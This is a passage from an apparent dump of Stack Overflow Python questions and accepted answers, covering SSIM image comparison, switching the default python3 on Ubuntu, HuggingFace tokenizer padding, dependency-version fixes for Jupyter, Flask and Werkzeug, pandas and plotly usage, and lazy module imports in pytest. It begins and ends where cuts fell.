    "Body": "I am trying to calculate the SSIM between corresponding images. For example, an image called 106.tif in the ground truth directory corresponds to a 'fake' generated image 106.jpg in the fake directory.\nThe ground truth directory absolute pathway is /home/pr/pm/zh_pix2pix/datasets/mousebrain/test/B\nThe fake directory absolute pathway is /home/pr/pm/zh_pix2pix/output/fake_B\nThe images inside correspond to each other, like this:\nsee image\nThere are thousands of these images I want to compare on a one-to-one basis. I do not want to compare SSIM of one image to many others. Both the corresponding ground truth and fake images have the same file name, but different extension (i.e. 106.tif and 106.jpg) and I only want to compare them to each other.\nI am struggling to edit available scripts for SSIM comparison in this way. I want to use this one: https://github.com/mostafaGwely/Structural-Similarity-Index-SSIM-/blob/master/ssim.py but other suggestions are welcome. The code is also shown below:\n# Usage:\n#\n# python3 script.py --input original.png --output modified.png\n# Based on: https://github.com/mostafaGwely/Structural-Similarity-Index-SSIM-\n\n# 1. Import the necessary packages\n#from skimage.measure import compare_ssim\nfrom skimage.metrics import structural_similarity as ssim\nimport argparse\nimport imutils\nimport cv2\n\n# 2. Construct the argument parse and parse the arguments\nap = argparse.ArgumentParser()\nap.add_argument(\"-f\", \"--first\", required=True, help=\"Directory of the image that will be compared\")\nap.add_argument(\"-s\", \"--second\", required=True, help=\"Directory of the image that will be used to compare\")\nargs = vars(ap.parse_args())\n\n# 3. Load the two input images\nimageA = cv2.imread(args[\"first\"])\nimageB = cv2.imread(args[\"second\"])\n\n# 4. Convert the images to grayscale\ngrayA = cv2.cvtColor(imageA, cv2.COLOR_BGR2GRAY)\ngrayB = cv2.cvtColor(imageB, cv2.COLOR_BGR2GRAY)\n\n# 5. Compute the Structural Similarity Index (SSIM) between the two\n#    images, ensuring that the difference image is returned\n#(score, diff) = compare_ssim(grayA, grayB, full=True)\n(score, diff) = ssim(grayA, grayB, full=True)\ndiff = (diff * 255).astype(\"uint8\")\n\n# 6. You can print only the score if you want\nprint(\"SSIM: {}\".format(score))\n\nThe use of argparse currently limits me to just one image at a time, but I would ideally like to compare them using a loop across the ground truth and fake directories. Any advice would be appreciated.\n",
    "AcceptedAnswerId": 71567872,
    "AcceptedAnswer": "Here's a working example to compare one image to another. You can expand it to compare multiple at once. Two test input images with slight differences:\n\n\nResults\nHighlighted differences\n\n\nSimilarity score\n\nImage similarity 0.9639027981846681\n\nDifference masks\n\n\n\nCode\nfrom skimage.metrics import structural_similarity\nimport cv2\nimport numpy as np\n\nbefore = cv2.imread('5.jpg')\nafter = cv2.imread('6.jpg')\n\n# Convert images to grayscale\nbefore_gray = cv2.cvtColor(before, cv2.COLOR_BGR2GRAY)\nafter_gray = cv2.cvtColor(after, cv2.COLOR_BGR2GRAY)\n\n# Compute SSIM between two images\n(score, diff) = structural_similarity(before_gray, after_gray, full=True)\nprint(\"Image similarity\", score)\n\n# The diff image contains the actual image differences between the two images\n# and is represented as a floating point data type in the range [0,1] \n# so we must convert the array to 8-bit unsigned integers in the range\n# [0,255] before we can use it with OpenCV\ndiff = (diff * 255).astype(\"uint8\")\n\n# Threshold the difference image, followed by finding contours to\n# obtain the regions of the two input images that differ\nthresh = cv2.threshold(diff, 0, 255, cv2.THRESH_BINARY_INV | cv2.THRESH_OTSU)[1]\ncontours = cv2.findContours(thresh.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\ncontours = contours[0] if len(contours) == 2 else contours[1]\n\nmask = np.zeros(before.shape, dtype='uint8')\nfilled_after = after.copy()\n\nfor c in contours:\n    area = cv2.contourArea(c)\n    if area > 40:\n        x,y,w,h = cv2.boundingRect(c)\n        cv2.rectangle(before, (x, y), (x + w, y + h), (36,255,12), 2)\n        cv2.rectangle(after, (x, y), (x + w, y + h), (36,255,12), 2)\n        cv2.drawContours(mask, [c], 0, (0,255,0), -1)\n        cv2.drawContours(filled_after, [c], 0, (0,255,0), -1)\n\ncv2.imshow('before', before)\ncv2.imshow('after', after)\ncv2.imshow('diff',diff)\ncv2.imshow('mask',mask)\ncv2.imshow('filled after',filled_after)\ncv2.waitKey(0)\n\n"
}
{
    "Id": 71034111,
    "PostTypeId": 1,
    "Title": "How to set default python3 to python 3.9 instead of python 3.8 in Ubuntu 20.04 LTS",
    "Body": "I have installed Python 3.9 in the Ubuntu 20.04 LTS. Now the system has both Python 3.8 and Python 3.9.\n# which python\n# which python3\n/usr/bin/python3\n# which python3.8\n/usr/bin/python3.8\n# which python3.9\n/usr/bin/python3.9\n# ls -alith /usr/bin/python3\n12583916 lrwxrwxrwx 1 root root 9 Jul 19  2021 /usr/bin/python3 -> python3.8\n\nBut the pip3 command will still install everything into the Python 3.8 directory.\n# pip3 install --upgrade --find-links file:///path/to/directory \n\nI want to change that default pip3 behavior by updating the symbolic link /usr/bin/python3 to /usr/bin/python3.9.\nHow to do that?\n# update-alternatives --set python3 /usr/bin/python3.9\nThis command will not work as expected.\n\nHere is the pip3 info:\n# which pip3\n/usr/bin/pip3\n# ls -alith /usr/bin/pip3\n12589712 -rwxr-xr-x 1 root root 367 Jul 13  2021 /usr/bin/pip3\n# pip3 -V\npip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8)\n# \n\nThe alias command will not work:\n# alias python3=python3.9\n# ls -alith /usr/bin/python3\n12583916 lrwxrwxrwx 1 root root 9 Jul 19  2021 /usr/bin/python3 -> python3.8\n\n",
    "AcceptedAnswerId": 71034427,
    "AcceptedAnswer": "You should be able to use python3.9 -m pip install  to run pip with a specific python version, in this case 3.9.\nThe full docs on this are here: https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/\nIf you want python3 to point to python3.9 you could use the quick and dirty.\nalias python3=python3.9\n\nEDIT:\nTried to recreate your problem,\n# which python3\n/usr/bin/python3\n# python3 --version\nPython 3.8.10\n# which python3.8\n/usr/bin/python3.8\n# which python3.9\n/usr/bin/python3.9\n\nThen update the alternatives, and set new priority:\n# sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 1\n# sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.9 2\n# sudo update-alternatives --config python3\nThere are 2 choices for the alternative python3 (providing /usr/bin/python3).\n\n  Selection    Path                Priority   Status\n------------------------------------------------------------\n  0            /usr/bin/python3.9   2         auto mode\n  1            /usr/bin/python3.8   2         manual mode\n* 2            /usr/bin/python3.9   2         manual mode\n\nPress  to keep the current choice[*], or type selection number: 0\n\nCheck new version:\n# ls -alith /usr/bin/python3\n3338 lrwxrwxrwx 1 root root 25 Feb  8 14:33 /usr/bin/python3 -> /etc/alternatives/python3\n# python3 -V\nPython 3.9.5\n# ls -alith /usr/bin/pip3\n48482 -rwxr-xr-x 1 root root 367 Jul 13  2021 /usr/bin/pip3\n# pip3 -V\npip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.9)\n\nHope this helps (tried it in wsl2 Ubuntu 20.04 LTS)\n"
}
{
    "Id": 71166789,
    "PostTypeId": 1,
    "Title": "HuggingFace: ValueError: expected sequence of length 165 at dim 1 (got 128)",
    "Body": "I am trying to fine-tune the BERT language model on my own data. I've gone through their docs, but their tasks seem to be not quite what I need, since my end goal is embedding text. Here's my code:\nfrom datasets import load_dataset\nfrom transformers import BertTokenizerFast, AutoModel, TrainingArguments, Trainer\nimport glob\nimport os\n\n\nbase_path = '../data/'\nmodel_name = 'bert-base-uncased'\nmax_length = 512\ncheckpoints_dir = 'checkpoints'\n\ntokenizer = BertTokenizerFast.from_pretrained(model_name, do_lower_case=True)\n\n\ndef tokenize_function(examples):\n    return tokenizer(examples['text'], padding=True, truncation=True, max_length=max_length)\n\n\ndataset = load_dataset('text',\n        data_files={\n            'train': f'{base_path}train.txt',\n            'test': f'{base_path}test.txt',\n            'validation': f'{base_path}valid.txt'\n        }\n)\n\nprint('Tokenizing data. This may take a while...')\ntokenized_dataset = dataset.map(tokenize_function, batched=True)\ntrain_dataset = tokenized_dataset['train']\neval_dataset = tokenized_dataset['test']\n\nmodel = AutoModel.from_pretrained(model_name)\n\ntraining_args = TrainingArguments(checkpoints_dir)\n\nprint('Training the model...')\ntrainer = Trainer(model=model, args=training_args, train_dataset=train_dataset, eval_dataset=eval_dataset)\ntrainer.train()\n\nI get the following error:\n  File \"train_lm_hf.py\", line 44, in \n    trainer.train()\n...\n  File \"/opt/conda/lib/python3.7/site-packages/transformers/data/data_collator.py\", line 130, in torch_default_data_collator\n    batch[k] = torch.tensor([f[k] for f in features])\nValueError: expected sequence of length 165 at dim 1 (got 128)\n\nWhat am I doing wrong?\n",
    "AcceptedAnswerId": 71232059,
    "AcceptedAnswer": "I fixed this solution by changing the tokenize function to:\ndef tokenize_function(examples):\n    return tokenizer(examples['text'], padding='max_length', truncation=True, max_length=max_length)\n\n(note the padding argument). Also, I used a data collator like so:\ndata_collator = DataCollatorForLanguageModeling(\n    tokenizer=tokenizer, mlm=True, mlm_probability=0.15\n)\ntrainer = Trainer(\n        model=model,\n        args=training_args,\n        data_collator=data_collator,\n        train_dataset=train_dataset,\n        eval_dataset=eval_dataset\n)\n\n"
}
{
    "Id": 71544953,
    "PostTypeId": 1,
    "Title": "unreadable Jupyter Lab Notebook after upgrading pandas (Capture Validation Error)",
    "Body": "I was recently using Jupyter lab and decided to update my pandas version from 1.2 to the latest (1.4).  So I ran 'conda update pandas' which seemed to work fine.  However when I then launched Jupyter lab in the usual way 'jupyter lab' and tried to open the workbook I had just been working on I got the below error:\n\nUnreadable Notebook: C:\\Users...\\script.ipynb TypeError(\"init() got an unexpected keyword argument 'capture_validation_error'\")\n\nI am getting this same error when trying to open any of my .ipynb files that were previously working fine.  I can also open them fine in jupyter notebook, but for some reason they don't work in Jupyter lab anymore.  Any idea how I can fix this?\nThanks\n",
    "AcceptedAnswerId": 71595097,
    "AcceptedAnswer": "It turns out that a recent update to jupyter_server>=1.15.0 broke compatibility with nbformat, but did not update the conda recipe correctly per this Github pull request.\nIt is possible that while updating pandas, you may have inadvertently also updated jupyterlab and/or jupyter_server.\nWhile we wait for the build with the merged PR to come downstream, we can fix this dependency issue by updating nbformat manually with\nconda install -c conda-forge nbformat\n\nto get the newest version of nbformat with version >=5.2.\n"
}
{
    "Id": 71078751,
    "PostTypeId": 1,
    "Title": "VS Code Python Formatting: Change max line-length with autopep8 / yapf / black",
    "Body": "I am experimenting with different python formatters and would like to increase the max line length. Ideally without editing the settings.json file. Is there a way to achieve that?\n\n",
    "AcceptedAnswerId": 71078792,
    "AcceptedAnswer": "For all three formatters, the max line length can be increased with additional arguments passed in from settings, i.e.:\n\nautopep8 args: --max-line-length=120\nblack args: --line-length=120\nyapf args: --style={based_on_style: google, column_limit: 120, indent_width: 4}\n\nHope that helps someone in the future!\n\n"
}
{
    "Id": 71132469,
    "PostTypeId": 1,
    "Title": "Appending row to dataframe with concat()",
    "Body": "I have defined an empty data frame with\ndf = pd.DataFrame(columns=['Name', 'Weight', 'Sample'])\n\nand want to append rows in a for loop like this:\nfor key in my_dict:\n   ...\n   row = {'Name':key, 'Weight':wg, 'Sample':sm}\n   df = pd.concat(row, axis=1, ignore_index=True) \n\nBut I get this error\ncannot concatenate object of type ''; only Series and DataFrame objs are valid\n\nIf I use df = df.append(row, ignore_index=True), it works but it seems that append is deprecated. So, I want to use concat(). How can I fix that?\n",
    "AcceptedAnswerId": 71132587,
    "AcceptedAnswer": "You can transform your dict in pandas DataFrame\nimport pandas as pd\ndf = pd.DataFrame(columns=['Name', 'Weight', 'Sample'])\nfor key in my_dict:\n  ...\n  #transform your dic in DataFrame\n  new_df = pd.DataFrame([row])\n  df = pd.concat([df, new_df], axis=0, ignore_index=True)\n\n"
}
{
    "Id": 71271759,
    "PostTypeId": 1,
    "Title": "How to change MarkUpSafe version in virtual environment?",
    "Body": "I am trying to make an application using python and gRPC as shown in this article - link\nI am able to run the app successfully on my terminal but to run with a frontend I need to run it as a flask app, codebase. And I am doing all this in a virtual environment.\nwhen I run my flask command FLASK_APP=marketplace.py flask run\nThis is the error I get\nImportError: cannot import name 'soft_unicode' from 'markupsafe' (/Users/alex/Desktop/coding/virt/lib/python3.8/site-packages/markupsafe/__init__.py)\n\nOn researching about this error I found this link - it basically tells us that currently I am using a higher version of MarkUpSafe library than required.\nSo I did pip freeze --local  inside the virtualenv and got MarkUpSafe version to be MarkupSafe==2.1.0\nI think if I change the version of this library from 2.1.0 to 2.0.1 then the flask app might run.\nHow can I change this library's version from the terminal?\nPS: If you think changing the version of the library won't help in running the flask app, please let me know what else can I try in this.\n",
    "AcceptedAnswerId": 71274080,
    "AcceptedAnswer": "If downgrading will solve the issue for you try the following code inside your virtual environment.\npip install MarkupSafe==2.0.1\n"
}
{
    "Id": 71106940,
    "PostTypeId": 1,
    "Title": "Cannot import name '_centered' from 'scipy.signal.signaltools'",
    "Body": "Unable to import functions from scipy module.\nGives error :\nfrom scipy.signal.signaltools import _centered\nCannot import name '_centered' from 'scipy.signal.signaltools'\n\nscipy.__version__\n1.8.0\n\n",
    "AcceptedAnswerId": 71285979,
    "AcceptedAnswer": "If you need to use that specific version of statsmodels 0.12.x with scipy 1.8.0 I have the following hack.\nBasically it just re-publishes the existing (but private) _centered function as a public attribute to the module already imported in RAM.\nIt is a workaround, and if you can simply upgrade your dependencies to the latest versions. Only use this if you are forced to use those specific versions.\nimport  scipy.signal.signaltools\n\ndef _centered(arr, newsize):\n    # Return the center newsize portion of the array.\n    newsize = np.asarray(newsize)\n    currsize = np.array(arr.shape)\n    startind = (currsize - newsize) // 2\n    endind = startind + newsize\n    myslice = [slice(startind[k], endind[k]) for k in range(len(endind))]\n    return arr[tuple(myslice)]\n\nscipy.signal.signaltools._centered = _centered\n\n"
}
{
    "Id": 71652965,
    "PostTypeId": 1,
    "Title": "ImportError: cannot import name 'safe_str_cmp' from 'werkzeug.security'",
    "Body": "Any ideas on why I get this error?\nMy project was working fine. I copied it to an external drive and onto my laptop to work on the road; it worked fine. I copied it back to my desktop and had a load of issues with invalid interpreters etc, so I made a new project and copied just the scripts in, made a new requirements.txt and installed all the packages, but when I run it, I get this error:\nTraceback (most recent call last):\n  File \"E:\\Dev\\spot_new\\flask_blog\\run.py\", line 1, in \n    from flaskblog import app\n  File \"E:\\Dev\\spot_new\\flask_blog\\flaskblog\\__init__.py\", line 3, in \n    from flask_bcrypt import Bcrypt\n  File \"E:\\Dev\\spot_new\\venv\\lib\\site-packages\\flask_bcrypt.py\", line 21, in \n    from werkzeug.security import safe_str_cmp\nImportError: cannot import name 'safe_str_cmp' from 'werkzeug.security' (E:\\Dev\\spot_new\\venv\\lib\\site-packages\\werkzeug\\security.py)\n\nI've tried uninstalling Python, Anaconda, PyCharm, deleting every reg key and environment variable I can find that looks pythonic, reinstalling all from scratch but still no dice.\n",
    "AcceptedAnswerId": 71653849,
    "AcceptedAnswer": "Werkzeug released v2.1.0 today, removing werkzeug.security.safe_str_cmp.\nYou can probably resolve this issue by pinning Werkzeug~=2.0.0 in your requirements.txt file (or similar).\npip install Werkzeug~=2.0.0\n\nAfter that it is likely that you will also have an AttributeError related to the jinja package, so if you have it, also run:\npip install jinja2~=3.0.3\n\n"
}
{
    "Id": 71121056,
    "PostTypeId": 1,
    "Title": "Plotly Python update figure with dropMenu",
    "Body": "i am currently working with plotly i have a function called plotChart that takes a dataframe as input and plots a candlestick chart. I am trying to figure out a way to pass a list of dataframes  to the function plotChart and use a plotly dropdown menu to show the options on the input list by the stock name. The drop down menu will have the list of dataframe and when an option is clicked on it will update the figure in plotly is there away to do this. below is the code i have to plot a single dataframe\ndef make_multi_plot(df):\n    \n    fig = make_subplots(rows=2, cols=2,\n                        shared_xaxes=True,\n                        vertical_spacing=0.03,\n                        subplot_titles=('OHLC', 'Volume Profile'),\n                        row_width=[0.2, 0.7])\n\n    for s in df.name.unique():\n        \n        trace1 = go.Candlestick(\n            x=df.loc[df.name.isin([s])].time,\n            open=df.loc[df.name.isin([s])].open,\n            high=df.loc[df.name.isin([s])].high,\n            low=df.loc[df.name.isin([s])].low,\n            close=df.loc[df.name.isin([s])].close,\n            name = s)\n        fig.append_trace(trace1,1,1)\n        \n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsMid, mode='lines',name='MidBollinger'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsUpp, mode='lines',name='UpperBollinger'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].BbandsLow, mode='lines',name='LowerBollinger'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].vwap, mode='lines',name='VWAP'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].STDEV_1, mode='lines',name='UPPERVWAP'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].STDEV_N1, mode='lines',name='LOWERVWAP'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcMid, mode='lines',name='KcMid'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcUpper, mode='lines',name='KcUpper'),1,1)\n        fig.append_trace(go.Scatter(x=df.loc[df.name.isin([s])].time, y=df.loc[df.name.isin([s])].KcLow, mode='lines',name='KcLow'),1,1)\n        \n\n        trace2 = go.Bar(\n                x=df.loc[df.name.isin([s])].time,\n                y=df.loc[df.name.isin([s])].volume,\n                name = s)\n        fig.append_trace(trace2,2,1)\n        # fig.update_layout(title_text=s)\n        \n        \n        \n    graph_cnt=len(fig.data)\n\n        \n    tr = 11\n    symbol_cnt =len(df.name.unique())\n    for g in range(tr, graph_cnt):\n        fig.update_traces(visible=False, selector=g)\n        #print(g)\n    def create_layout_button(k, symbol):\n        \n        start, end = tr*k, tr*k+2\n        visibility = [False]*tr*symbol_cnt\n        visibility[start:end] = [True,True,True,True,True,True,True,True,True,True,True]\n        return dict(label = symbol,\n                    method = 'restyle',\n                    args = [{'visible': visibility[:-1],\n                             'title': symbol,\n                             'showlegend': False}])    \n    \n    fig.update(layout_xaxis_rangeslider_visible=False)\n    fig.update_layout(\n        updatemenus=[go.layout.Updatemenu(\n            active = 0,\n            buttons = [create_layout_button(k, s) for k, s in enumerate(df.name.unique())]\n            )\n        ])\n    \n    fig.show()\n\ni am trying to add annotations to the figure it will be different for each chart below is how i had it setup for the single chart df['superTrend'] is a Boolean column\nfor i in range(df.first_valid_index()+1,len(df.index)):\n        prev = i - 1\n        if df['superTrend'][i] != df['superTrend'][prev] and not np.isnan(df['superTrend'][i]) :\n            #print(i,df['inUptrend'][i])\n            fig.add_annotation(x=df['time'][i], y=df['open'][i],\n            text= 'Buy' if df['superTrend'][i] else 'Sell',\n            showarrow=True,\n            arrowhead=6,\n            font=dict(\n                #family=\"Courier New, monospace\",\n                size=20,\n                #color=\"#ffffff\"\n            ),)\n\n",
    "AcceptedAnswerId": 71155096,
    "AcceptedAnswer": "I adapted an example from the plotly community to your example and created the code. The point of creation is to create the data for each subplot and then switch between them by means of buttons. The sample data is created using representative companies of US stocks. one issue is that the title is set but not displayed. We are currently investigating this issue.\nimport yfinance as yf\nimport plotly.graph_objects as go\nfrom plotly.subplots import make_subplots\nimport pandas as pd\n\nsymbols = ['AAPL','GOOG','TSLA']\nstocks = pd.DataFrame()\nfor s in symbols:\n    data = yf.download(s, start=\"2021-01-01\", end=\"2021-12-31\")\n    data['mean'] = data['Close'].rolling(20).mean()\n    data['std'] = data['Close'].rolling(20).std()\n    data['upperBand'] = data['mean'] + (data['std'] * 2)\n    data.reset_index(inplace=True)\n    data['symbol'] = s\n    stocks = stocks.append(data, ignore_index=True)\n\ndef make_multi_plot(df):\n    \n    fig = make_subplots(rows=2, cols=1,\n                        shared_xaxes=True,\n                        vertical_spacing=0.03,\n                        subplot_titles=('OHLC', 'Volume Profile'),\n                        row_width=[0.2, 0.7])\n\n    for s in df.symbol.unique():\n        trace1 = go.Candlestick(\n            x=df.loc[df.symbol.isin([s])].Date,\n            open=df.loc[df.symbol.isin([s])].Open,\n            high=df.loc[df.symbol.isin([s])].High,\n            low=df.loc[df.symbol.isin([s])].Low,\n            close=df.loc[df.symbol.isin([s])].Close,\n            name=s)\n        fig.append_trace(trace1,1,1)\n        \n        trace2 = go.Scatter(\n            x=df.loc[df.symbol.isin([s])].Date,\n            y=df.loc[df.symbol.isin([s])].upperBand,\n            name=s)\n        fig.append_trace(trace2,1,1)\n        \n        trace3 = go.Bar(\n            x=df.loc[df.symbol.isin([s])].Date,\n            y=df.loc[df.symbol.isin([s])].Volume,\n            name=s)\n        fig.append_trace(trace3,2,1)\n        # fig.update_layout(title_text=s)\n    \n    # Calculate the total number of graphs\n    graph_cnt=len(fig.data)\n    # Number of Symbols\n    symbol_cnt =len(df.symbol.unique())\n    # Number of graphs per symbol\n    tr = 3\n    # Hide setting for initial display\n    for g in range(tr, graph_cnt): \n        fig.update_traces(visible=False, selector=g)\n\n    def create_layout_button(k, symbol):\n        start, end = tr*k, tr*k+2\n        visibility = [False]*tr*symbol_cnt\n        # Number of graphs per symbol, so if you add a graph, add True.\n        visibility[start:end] = [True,True,True]\n        return dict(label = symbol,\n                    method = 'restyle',\n                    args = [{'visible': visibility[:-1],\n                             'title': symbol,\n                             'showlegend': True}])    \n    \n    fig.update(layout_xaxis_rangeslider_visible=False)\n    fig.update_layout(\n        updatemenus=[go.layout.Updatemenu(\n            active = 0,\n            buttons = [create_layout_button(k, s) for k, s in enumerate(df.symbol.unique())]\n            )\n        ])\n    \n    fig.show()\n    return fig.layout\n    \nmake_multi_plot(stocks)\n\n\n\n\n"
}
{
    "Id": 71193085,
    "PostTypeId": 1,
    "Title": "Creating nested columns in python dataframe",
    "Body": "I have 3 columns namely Models(should be taken as index), Accuracy without normalization, Accuracy with normalization (zscore, minmax, maxabs, robust) and these are required to be created as:\n ------------------------------------------------------------------------------------\n|   Models  |  Accuracy without normalization    |      Accuracy with normalization  |\n|           |                                    |-----------------------------------|\n|           |                                    | zscore | minmax | maxabs | robust |\n ------------------------------------------------------------------------------------\n\n\ndfmod-> Models column\ndfacc-> Accuracy without normalization\ndfacc1-> Accuracy with normalization - zscore\ndfacc2-> Accuracy with normalization - minmax\ndfacc3-> Accuracy with normalization - maxabs\ndfacc4-> Accuracy with normalization - robust\n\ndfout=pd.DataFrame({('Accuracy without Normalization'):{dfacc},\n     ('Accuracy using Normalization','zscore'):{dfacc1},\n     ('Accuracy using Normalization','minmax'):{dfacc2},\n     ('Accuracy using Normalization','maxabs'):{dfacc3},\n     ('Accuracy using Normalization','robust'):{dfacc4},\n   },index=dfmod\n)\n\nI was trying to do something like this but i can't figure out any further\nTest data:\nqda    0.6333       0.6917      0.5917      0.6417     0.5833\nsvm    0.5333       0.6917      0.5333      0.575      0.575\nlda    0.5333       0.6583      0.5333      0.5667     0.5667\nlr     0.5333       0.65        0.4917      0.5667     0.5667\ndt     0.5333       0.65        0.4917      0.5667     0.5667\nrc     0.5083       0.6333      0.4917      0.525      0.525\nnb     0.5          0.625       0.475       0.5        0.4833\nrfc    0.5          0.625       0.4417      0.4917     0.4583\nknn    0.3917       0.6         0.4417      0.4833     0.45\net     0.375        0.5333      0.4333      0.4667     0.45\ndc     0.375        0.5333      0.4333      0.4667     0.425\nqds    0.3417       0.5333      0.4         0.4583     0.3667\nlgt    0.3417       0.525       0.3917      0.45       0.3583\nlt     0.2333       0.45        0.3917      0.4167     0.3417\n\nThese are values for respective subcolumns in order specified in the table above\n",
    "AcceptedAnswerId": 71194341,
    "AcceptedAnswer": "There's a dirty way to do this, I'll write about it till someone answers with a better idea. Here we go:\nimport pandas as pd\n\n# I assume that you can read raw data named test.csv by pandas and\n# set header = None cause you mentioned the Test data without any headers, so:\ndf = pd.read_csv(\"test.csv\", header = None)\n\n# Then define preferred Columns! \nMyColumns = pd.MultiIndex.from_tuples([(\"Models\" , \"\"),\n                                       (\"Accuracy without normalization\" , \"\"),\n                                       (\"Accuracy with normalization\" , \"zscore\"),\n                                       (\"Accuracy with normalization\" , \"minmax\"),\n                                       (\"Accuracy with normalization\" , \"maxabs\"),\n                                       (\"Accuracy with normalization\" , \"robust\")])\n\n# Create new DataFrame with specified Columns, after this you should pass values \nNew_DataFrame = pd.DataFrame(df , columns = MyColumns)\n\n# a loop for passing values\nfor item in range(len(MyColumns)):\n    New_DataFrame.loc[: , MyColumns[item]] = df.iloc[: , item]\n\nThis gives me:\n\nafter all, if you want to set Models as the index of New_DataFrame, You can continue with:\nNew_DataFrame.set_index(New_DataFrame.columns[0][0] , inplace=True)\nNew_DataFrame\n\nThis gives me:\n\n"
}
{
    "Id": 71575112,
    "PostTypeId": 1,
    "Title": "Annotate a function argument as being a specific module",
    "Body": "I have a pytest fixture that imports a specific module. This is needed as importing the module is very expensive, so we don't want to do it on import-time (i.e. during pytest test collection). This results in code like this:\n@pytest.fixture\ndef my_module_fix():\n    import my_module\n    yield my_module\n\ndef test_something(my_module_fix):\n    assert my_module_fix.my_func() = 5\n\nI am using PyCharm and would like to have type-checking and autocompletion in my tests. To achieve that, I would somehow have to annotate the my_module_fix parameter as having the type of the my_module module.\nI have no idea how to achieve that. All I found is that I can annotate my_module_fix as being of type types.ModuleType, but that is not enough: It is not any module, it is always my_module.\n",
    "AcceptedAnswerId": 71680238,
    "AcceptedAnswer": "If I get your question, you have two (or three) separate goals\n\nDeferred import of slowmodule\nAutocomplete to continue to work as if it was a standard import\n(Potentially?) typing (e.g. mypy?) to continue to work\n\nI can think of at least five different approaches, though I'll only briefly mention the last because it's insane.\n\nImport the module inside your tests\nThis is (by far) the most common and IMHO preferred solution.\ne.g. instead of\nimport slowmodule\n\ndef test_foo():\n    slowmodule.foo()\n\ndef test_bar():\n    slowmodule.bar()\n\nyou'd write:\ndef test_foo():\n    import slowmodule\n    slowmodule.foo()\n\ndef test_bar():\n    import slowmodule\n    slowmodule.bar()\n\n\n[deferred importing] Here, the module will be imported on-demand/lazily.  So if you have pytest setup to fail-fast, and another test fails before pytest gets to your (test_foo, test_bar) tests, the module will never be imported and you'll never incur the runtime cost.\nBecause of Python's module cache, subsequent import statements won't actually re-import the module, just grab a reference to the already-imported module.\n\n[autocomplete/typing] Of course, autocomplete will continue to work as you expect in this case.  This is a perfectly fine import pattern.\n\n\nWhile it does require adding potentially many additional import statements (one inside each test function), it's immediately clear what is going on (regardless of whether it's clear why it's going on).\n\n[3.7+] Proxy your module with module __getattr__\nIf you create a module (e.g. slowmodule_proxy.py) with the contents like:\ndef __getattr__(name):\n    import slowmodule\n    return getattr(slowmodule, name)\n\nAnd in your tests, e.g.\nimport slowmodule\n\ndef test_foo():\n    slowmodule.foo()\n\ndef test_bar():\n    slowmodule.bar()\n\ninstead of:\nimport slowmodule\n\nyou write:\nimport slowmodule_proxy as slowmodule\n\n\n[deferred import] Thanks to PEP-562, you can \"request\" any name from slowmodule_proxy and it will fetch and return the corresponding name from slowmodule.  Just as above, including the import inside the function will cause slowmodule to be imported only when the function is called and executed instead of on module load.  Module caching still applies here of course, so you're only incurring the import penalty once per interpreter session.\n\n[autocomplete] However, while deferred importing will work (and your tests run without issue), this approach (as stated so far) will \"break\" autocomplete:\n\n\n\nNow we're in the realm of PyCharm.  Some IDEs will perform \"live\" analysis of modules and actually load up the module and inspect its members.  (PyDev had this option).  If PyCharm did this, implementing module.__dir__ (same PEP) or __all__ would allow your proxy module to masquerade as the actual slowmodule and autocomplete would work.\u2020  But, PyCharm does not do this.\nNonetheless, you can fool PyCharm into giving you autocomplete suggestions:\nif False:\n    import slowmodule\nelse:\n    import slowmodule_proxy as slowmodule\n\nThe interpreter will only execute the else branch, importing the proxy and naming it slowmodule (so your test code can continue to reference slowmodule unchanged).\nBut PyCharm will now provide autocompletion for the underlying module:\n\n\u2020 While live-analysis can be an incredibly helpful, there's also a (potential) security concern that comes with it that static syntax analysis doesn't have.  And the maturation of type hinting and stub files has made it less of an issue still.\n\nProxy slowmodule explicitly\nIf you really hated the dynamic proxy approach (or the fact that you have to fool PyCharm in this way), you could proxy the module explicitly.\n(You'd likely only want to consider this if the slowmodule API is stable.)\nIf slowmodule has methods foo and bar you'd create a proxy module  like:\ndef foo(*args, **kwargs):\n    import slowmodule\n    return slowmodule.foo(*args, **kwargs)\n\ndef bar(*args, **kwargs):\n    import slowmodule\n    return slowmodule.bar(*args, **kwargs)\n\n(Using args and kwargs to pass arguments through to the underlying callables.  And you could add type hinting to these functions to mirror the slowmodule functions.)\nAnd in your test,\nimport slowmodule_proxy as slowmodule\n\nSame as before.  Importing inside the method gives you the deferred importing you want and the module cache takes care of multiple import calls.\nAnd since it's a real module whose contents can be statically analyzed, there's no need to \"fool\" PyCharm.\nSo the benefit of this solution is that you don't have a bizarre looking if False in your test imports.  This, however, comes at the (substantial) cost of having to maintain a proxy file alongside your module -- which could prove painful in the case that slowmodule's API wasn't stable.\n\n[3.5+] Use importlib's LazyLoader instead of a proxy module\nInstead of the proxy module slowmodule_proxy, you could follow a pattern similar to the one shown in the importlib docs\n\n>>> import importlib.util\n>>> import sys\n>>> def lazy_import(name):\n...     spec = importlib.util.find_spec(name)\n...     loader = importlib.util.LazyLoader(spec.loader)\n...     spec.loader = loader\n...     module = importlib.util.module_from_spec(spec)\n...     sys.modules[name] = module\n...     loader.exec_module(module)\n...     return module\n...\n>>> lazy_typing = lazy_import(\"typing\")\n>>> #lazy_typing is a real module object,\n>>> #but it is not loaded in memory yet.\n\n\nYou'd still need to fool PyCharm though, so something like:\nif False:\n    import slowmodule\nelse:\n    slowmodule = 